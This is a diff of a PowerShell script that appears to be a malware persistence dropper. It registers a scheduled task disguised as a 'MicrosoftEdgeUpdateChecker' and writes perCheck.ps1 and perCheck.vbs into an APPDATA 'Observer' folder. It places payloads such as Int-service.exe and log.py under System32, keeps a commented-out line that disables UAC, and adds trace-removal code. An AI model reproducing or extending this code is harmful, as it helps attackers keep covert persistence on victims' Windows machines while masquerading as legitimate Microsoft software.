@@ -1,7 +1,8 @@
 $taskName = "MicrosoftEdgeUpdateChecker{C599C82-62E9-42CB-98E3-683A5482339}"
 $sessionUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-$perCheck = Join-Path $env:APPDATA "perCheck.ps1"
-$perCheckVbs = Join-Path $env:APPDATA "perCheck.vbs"
+$perFolder = Join-Path $env:APPDATA "Observer"
+$perCheck = Join-Path $perFolder "perCheck.ps1"
+$perCheckVbs = Join-Path $perFolder "perCheck.vbs"
 $destino = 'C:\Windows\System32\Int-service.exe'
 $destino2 = 'C:\Windows\System32\ap32\log.py'
 $destino3 = 'C:\Windows\System32\re-as\WPy64.zip'
@@ -93,19 +94,20 @@ if (Test-IsAdmin) {
     #New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
 
     Unregister-ScheduledTask -TaskName "$taskName" -Confirm:`$false
-    Remove-Item $perCheck -Force
-    Remove-Item $perCheckVbs -Force
+    Remove-Item $perFolder -Recurse -Force
+    if (Test-Path Join-Path `$env:APPDATA "run.ps1") {
+        Remove-Item Join-Path `$env:APPDATA "run.ps1" -Force
+    }    
     exit
 }
 "@
 
 
-if (Test-Path $perCheck) {
-    Remove-Item $perCheck -Force
+if (Test-Path $perFolder) {
+    Remove-Item $perFolder -Force
 }
-if (Test-Path $perCheckVbs) {
-    Remove-Item $perCheckVbs -Force
-}
+
+New-Item -Path $perFolder -ItemType Directory
 
 Set-Content -Path $perCheck -Value $conteudo -Encoding UTF8
 Set-Content -Path $perCheckVbs -Value $vbsContent -Encoding ASCII
